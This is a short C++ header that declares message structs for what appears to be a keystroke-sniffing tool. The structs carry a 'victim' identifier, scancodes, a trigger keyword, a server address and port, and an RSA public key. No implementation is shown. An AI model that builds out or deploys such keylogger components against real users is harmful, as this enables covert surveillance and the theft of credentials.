#ifndef MESSAGES_H
#define MESSAGES_H

#include "common/common.hpp"

struct KeySniffingMessage
{
    uint16_t victim;
    uint16_t scancode;
    uint32_t count;

    std::string ToString() const;
    int Serialize(unsigned char *buf, int length) const;
    int Deserialize(const unsigned char *buf, int length);
};

struct StartSniffingMessage
{
    char keyword[16];
    struct sockaddr_in server;
    uint16_t port;
    rsa_key public_key;
    uint16_t victim;

    std::string ToString() const;
    int Serialize(unsigned char *buf, int length) const;
    int Deserialize(const unsigned char *buf, int length);
};

#endif // MESSAGES_H
